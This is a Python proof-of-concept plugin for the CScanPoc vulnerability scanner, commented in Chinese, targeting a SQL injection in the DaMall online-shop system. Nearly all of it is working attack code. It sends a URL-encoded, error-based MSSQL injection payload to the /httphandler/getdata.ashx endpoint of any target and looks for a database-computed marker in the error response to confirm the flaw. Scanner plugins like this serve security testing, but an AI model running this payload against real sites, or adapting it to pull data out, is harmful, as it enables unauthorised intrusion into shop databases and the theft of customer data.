# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'DaMall_0000'  # 平台漏洞编号，留空
    name = 'DaMall商城系统sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-30'  # 漏洞公布时间
    desc = '''
        DaMall商城系统sql注入
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=097957'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DaMall'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '56f7b33c-5a46-4e4b-a747-218c02ecb855'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            url = '{target}'.format(target=self.target) + \
                "/httphandler/getdata.ashx"
            payload = "brandid=1%20AND%202391%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%2899999-33333%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C100%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29"
            req = requests.get(url, data=payload)
            if req.status_code == 500 and 'qpbqq66666qzpxq' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
